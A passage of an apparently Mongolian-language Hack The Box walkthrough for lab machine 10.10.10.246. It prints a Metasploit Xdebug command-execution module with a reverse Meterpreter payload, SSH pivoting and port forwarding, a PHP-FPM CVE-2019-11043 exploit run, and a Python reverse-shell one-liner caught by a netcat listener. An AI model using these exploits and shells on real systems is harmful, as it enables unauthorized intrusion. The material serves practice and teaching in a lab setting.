</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>initialize</span>(info <span style=color:#f92672>=</span> {})
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>super</span>(update_info(info,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Name&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;xdebug Unauthenticated OS Command Execution&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Description&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>%q{
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       This allows the attacker to execute arbitrary php code as the context of the web user.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      }</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;DisclosureDate&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;2017-09-17&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Author&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Ricter Zheng&#39;</span>, <span style=color:#75715e>#Discovery https://twitter.com/RicterZ</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Shaksham Jaiswal&#39;</span>, <span style=color:#75715e># MinatoTW</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Mumbai&#39;</span> <span style=color:#75715e># Austin Hudson</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;References&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;URL&#39;</span>, <span style=color:#e6db74>&#39;https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/&#39;</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;URL&#39;</span>, <span style=color:#e6db74>&#39;https://paper.seebug.org/397/&#39;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;License&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>MSF_LICENSE</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Platform&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;php&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Arch&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>[</span><span style=color:#66d9ef>ARCH_PHP</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;DefaultTarget&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Stance&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Stance</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Aggressive</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;DefaultOptions&#39;</span> <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;PAYLOAD&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;php/meterpreter/reverse_tcp&#39;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Payload&#39;</span> <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;DisableNops&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Targets&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#39;Automatic&#39;</span>, {} <span style=color:#f92672>]]</span>,
</span></span><span style=display:flex><span>    ))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    register_options(<span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>OptString</span><span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#39;PATH&#39;</span>, <span style=color:#f92672>[</span> <span style=color:#66d9ef>true</span>, <span style=color:#e6db74>&#34;Path to target webapp&#34;</span>, <span style=color:#e6db74>&#34;/index.php&#34;</span><span style=color:#f92672>]</span>),
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>OptAddress</span><span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#39;SRVHOST&#39;</span>, <span style=color:#f92672>[</span> <span style=color:#66d9ef>true</span>, <span style=color:#e6db74>&#34;Callback host for accepting connections&#34;</span>, <span style=color:#e6db74>&#34;0.0.0.0&#34;</span><span style=color:#f92672>]</span>),
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>OptInt</span><span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#39;SRVPORT&#39;</span>, <span style=color:#f92672>[</span><span style=color:#66d9ef>true</span>, <span style=color:#e6db74>&#34;Port to listen for the debugger&#34;</span>, <span style=color:#ae81ff>9000</span><span style=color:#f92672>]</span>),
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>Opt</span><span style=color:#f92672>::</span><span style=color:#66d9ef>RPORT</span>(<span style=color:#ae81ff>80</span>),
</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>begin</span>
</span></span><span style=display:flex><span>      res <span style=color:#f92672>=</span> send_request_cgi({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;uri&#39;</span> <span style=color:#f92672>=&gt;</span> datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;PATH&#34;</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;method&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;GET&#39;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#39;vars_get&#39;</span> <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#39;XDEBUG_SESSION_START&#39;</span> <span style=color:#f92672>=&gt;</span> rand_text_alphanumeric(<span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>       }
</span></span><span style=display:flex><span>      })
</span></span><span style=display:flex><span>      vprint_status <span style=color:#e6db74>&#34;Request sent</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>#{</span>res<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> res <span style=color:#f92672>&amp;&amp;</span> res<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>to_s <span style=color:#f92672>=~</span> <span style=color:#e6db74>/XDEBUG/i</span>
</span></span><span style=display:flex><span>        vprint_good(<span style=color:#e6db74>&#34;Looks like remote server has xdebug enabled</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>CheckCode</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Detected</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>CheckCode</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Safe</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>rescue</span> <span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>ConnectionError</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>CheckCode</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Unknown</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>
</span></span><span style=display:flex><span>    payl <span style=color:#f92672>=</span> <span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>encode_base64(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>#{</span>payload<span style=color:#f92672>.</span>encoded<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    cmd1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;eval -i 1 -- &#34;</span> <span style=color:#f92672>+</span> <span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Text</span><span style=color:#f92672>.</span>encode_base64(<span style=color:#e6db74>&#34;eval(base64_decode(</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>#{</span>payl<span style=color:#e6db74>}</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>));&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    webserver <span style=color:#f92672>=</span> <span style=color:#66d9ef>Thread</span><span style=color:#f92672>.</span>new <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>begin</span>
</span></span><span style=display:flex><span>      server <span style=color:#f92672>=</span> <span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Socket</span><span style=color:#f92672>::</span><span style=color:#66d9ef>TcpServer</span><span style=color:#f92672>.</span>create(
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;LocalPort&#39;</span> <span style=color:#f92672>=&gt;</span> datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;SRVPORT&#39;</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;LocalHost&#39;</span> <span style=color:#f92672>=&gt;</span> datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;SRVHOST&#39;</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;Context&#39;</span> <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#39;Msf&#39;</span> <span style=color:#f92672>=&gt;</span> framework,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#39;MsfExploit&#39;</span> <span style=color:#f92672>=&gt;</span> self
</span></span><span style=display:flex><span>      })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      client <span style=color:#f92672>=</span> server<span style=color:#f92672>.</span>accept
</span></span><span style=display:flex><span>      print_status(<span style=color:#e6db74>&#34;Waiting for client response.&#34;</span>)
</span></span><span style=display:flex><span>      data <span style=color:#f92672>=</span> client<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>      print_status(<span style=color:#e6db74>&#34;Receiving response&#34;</span>)
</span></span><span style=display:flex><span>      vprint_line(data)
</span></span><span style=display:flex><span>      print_status(<span style=color:#e6db74>&#34;Shell might take upto a minute to respond.Please be patient.&#34;</span>)
</span></span><span style=display:flex><span>      print_status(<span style=color:#e6db74>&#34;Sending payload of size </span><span style=color:#e6db74>#{</span>cmd1<span style=color:#f92672>.</span>length<span style=color:#e6db74>}</span><span style=color:#e6db74> bytes&#34;</span>)
</span></span><span style=display:flex><span>      client<span style=color:#f92672>.</span>write(cmd1)
</span></span><span style=display:flex><span>      client<span style=color:#f92672>.</span>close
</span></span><span style=display:flex><span>      server<span style=color:#f92672>.</span>close
</span></span><span style=display:flex><span>      webserver<span style=color:#f92672>.</span>exit
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>ensure</span>
</span></span><span style=display:flex><span>      webserver<span style=color:#f92672>.</span>exit
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>    send_request_cgi({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;uri&#39;</span> <span style=color:#f92672>=&gt;</span> datastore<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;PATH&#39;</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;method&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;GET&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;headers&#39;</span> <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#39;X-Forwarded-For&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>#{</span>lhost<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#39;Cookie&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;XDEBUG_SESSION=&#39;</span><span style=color:#f92672>+</span>rand_text_alphanumeric(<span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div><p>Exploit болохгүй байсан. Тэгээд цаг нилээн аваад байхаар нь бэлэн rsa -г writeup, forum үзэж байгаад шууд хуулсан.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-----BEGIN RSA PRIVATE KEY-----  
</span></span><span style=display:flex><span>MII***********
</span></span><span style=display:flex><span>-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><p><code>www-data</code> - нэрээр нэвтэрч ороод user.txt авсан. <code>-p 2222</code> бичихгүй бол болохгүй <code>nmap</code> дээр ssh порт 2222 гэж заасан байсан.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -i id_rsa_www-data www-data@10.10.10.246 -p <span style=color:#ae81ff>2222</span>
</span></span></code></pre></div><h3 id=8-privilege-escalation>8. Privilege escalation<a hidden class=anchor aria-hidden=true href=#8-privilege-escalation>#</a></h3><p>ssh дотроос ifconfig:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>eth0: flags<span style=color:#f92672>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style=color:#ae81ff>1500</span>
</span></span><span style=display:flex><span>        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
</span></span><span style=display:flex><span>        ether 02:42:ac:14:00:0a  txqueuelen <span style=color:#ae81ff>0</span>  <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>376</span>  bytes <span style=color:#ae81ff>47797</span> <span style=color:#f92672>(</span>47.7 KB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>275</span>  bytes <span style=color:#ae81ff>72946</span> <span style=color:#f92672>(</span>72.9 KB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>eth1: flags<span style=color:#f92672>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style=color:#ae81ff>1500</span>
</span></span><span style=display:flex><span>        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
</span></span><span style=display:flex><span>        ether 02:42:c0:a8:fe:02  txqueuelen <span style=color:#ae81ff>0</span>  <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>48</span>  bytes <span style=color:#ae81ff>29063</span> <span style=color:#f92672>(</span>29.0 KB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>25</span>  bytes <span style=color:#ae81ff>1796</span> <span style=color:#f92672>(</span>1.7 KB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>lo: flags<span style=color:#f92672>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span style=color:#ae81ff>65536</span>
</span></span><span style=display:flex><span>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span style=display:flex><span>        loop  txqueuelen <span style=color:#ae81ff>1000</span>  <span style=color:#f92672>(</span>Local Loopback<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>28</span>  bytes <span style=color:#ae81ff>1485</span> <span style=color:#f92672>(</span>1.4 KB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>28</span>  bytes <span style=color:#ae81ff>1485</span> <span style=color:#f92672>(</span>1.4 KB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p><code>192.168.254.2</code> -> <code>192.168.254.3</code> - ip хаяг</p><p>Port forwarding (sudo):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p <span style=color:#ae81ff>2222</span> -i id_rsa_www-data
</span></span></code></pre></div><p>Out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>The authenticity of host <span style=color:#e6db74>&#39;[10.10.10.246]:2222 ([10.10.10.246]:2222)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ECDSA key fingerprint is SHA256:SO5uMKk4fPWk/kDc0dLD5Uf7dlyIes4r6s26waZlxkQ.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Warning: Permanently added &#39;</span><span style=color:#f92672>[</span>10.10.10.246<span style=color:#f92672>]</span>:2222<span style=color:#e6db74>&#39; (ECDSA) to the list of known hosts.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>* Documentation:  https://help.ubuntu.com
</span></span></span><span style=display:flex><span><span style=color:#e6db74>* Management:     https://landscape.canonical.com
</span></span></span><span style=display:flex><span><span style=color:#e6db74>* Support:        https://ubuntu.com/advantage
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>This system has been minimized by removing packages and content that are
</span></span></span><span style=display:flex><span><span style=color:#e6db74>not required on a system that users do not log into.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>To restore this content, you can run the &#39;</span>unminimize<span style=color:#960050;background-color:#1e0010>&#39;</span> command.
</span></span><span style=display:flex><span>Last login: Mon Nov  <span style=color:#ae81ff>8</span> 10:57:19 <span style=color:#ae81ff>2021</span> from 10.10.14.84
</span></span></code></pre></div><p>localhost эсхүл 127.0.0.1 хандахаар:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>batch mode: /usr/bin/ersatool create|print|revoke CN 
</span></span></code></pre></div><p>Browser -> Network цэсээр ороод харвал:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>X-Powered-By
</span></span><span style=display:flex><span>PHP-FPM/7.1
</span></span></code></pre></div><ul><li><a href=https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc>https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc</a></li><li><a href=https://github.com/theMiddleBlue/CVE-2019-11043>https://github.com/theMiddleBlue/CVE-2019-11043</a></li></ul><p>Git
git clone <a href=https://github.com/theMiddleBlue/CVE-2019-11043.git>https://github.com/theMiddleBlue/CVE-2019-11043.git</a>
dedsec.py: exploit.py ажилуулсны дараа бэлэн py ажилууллах rev shell. Бэлэн код аваад хуулсан.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/usr/bin/python3.6 -c </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.254.2&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;http://192.168.254.3/index.php?a=&#34;</span><span style=color:#f92672>+</span>payload)
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><p>Netcat: <a href=https://github.com/H74N/netcat-binaries/blob/master/nc>https://github.com/H74N/netcat-binaries/blob/master/nc</a></p><p>Дээр байгаа 3 файл хэрэгтэй. Нэгтгэж аваад нэг dir дотор оруулсан.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>total <span style=color:#ae81ff>780</span>
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi     <span style=color:#ae81ff>72</span> Nov  <span style=color:#ae81ff>8</span> 06:11 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi     <span style=color:#ae81ff>26</span> Nov  <span style=color:#ae81ff>8</span> 06:07 ..
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> ca4mi ca4mi    <span style=color:#ae81ff>349</span> Nov  <span style=color:#ae81ff>8</span> 06:05 dedsec.py
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> ca4mi ca4mi   <span style=color:#ae81ff>4280</span> Nov  <span style=color:#ae81ff>8</span> 06:02 exploit.py
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> ca4mi ca4mi   <span style=color:#ae81ff>1675</span> Nov  <span style=color:#ae81ff>8</span> 06:11 id_rsa_www-data
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> ca4mi ca4mi <span style=color:#ae81ff>779832</span> Nov  <span style=color:#ae81ff>8</span> 06:06 n
</span></span></code></pre></div><p>scp:
Тэгээд <code>scp</code>-р файлуудаа хуулсан.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp -P <span style=color:#ae81ff>2222</span> -i id_rsa_www-data nc www-data@10.10.10.246:/tmp/nc
</span></span><span style=display:flex><span>scp -P <span style=color:#ae81ff>2222</span> -i id_rsa_www-data exploit.py www-data@10.10.10.246:/tmp/exploit.py
</span></span><span style=display:flex><span>scp -P <span style=color:#ae81ff>2222</span> -i id_rsa_www-data dedsec.py www-data@10.10.10.246:/tmp/dedsec.py
</span></span></code></pre></div><p>nc run:
bin шинээр ажилууллж байгаа тул <code>chmod +x</code> хийнэ.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@web:/tmp$ chmod +x nc
</span></span><span style=display:flex><span>www-data@web:/tmp$ ./nc -lvnp <span style=color:#ae81ff>9001</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>9001</span> ...
</span></span></code></pre></div><p>exploit.py ажилуулбал:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 exploit.py --url <span style=color:#f92672>[</span>http://192.168.254.3/index.php<span style=color:#f92672>](</span>http://192.168.254.3/index.php<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Хэвийн байлаа:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@web:/tmp$ python3 exploit.py --url http://192.168.254.3/index.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> QSL candidate: 1754, 1759, <span style=color:#ae81ff>1764</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Target seems vulnerable <span style=color:#f92672>(</span>QSL:1754/HVL:220<span style=color:#f92672>)</span>: PHPSESSID<span style=color:#f92672>=</span>a4632a83f8ca8a3690e01fc3cf1e1e19; path<span style=color:#f92672>=</span>/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> RCE successfully exploited!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    You should be able to run commands using:
</span></span><span style=display:flex><span>    curl http://192.168.254.3/index.php?a<span style=color:#f92672>=</span>bin/ls+/
</span></span></code></pre></div><p>Бэлэн кодоо ажилууллах.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 dedsec.py
</span></span></code></pre></div><p>Энэ өөр таб дээр порт сонсож байгаад pki орж байгаа log:</p><pre tabindex=0><code>listening on [any] 9001 ...
connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 41604
www-data@pki:~/html$ ls
ls
index.php  uploads
www-data@pki:~/html$ 
</code></pre><p><code>Ersatool</code> - access шалгах:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ls -al /usr/bin/ersatool
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>22496</span> Jun <span style=color:#ae81ff>21</span> 17:05 /usr/bin/ersatoo
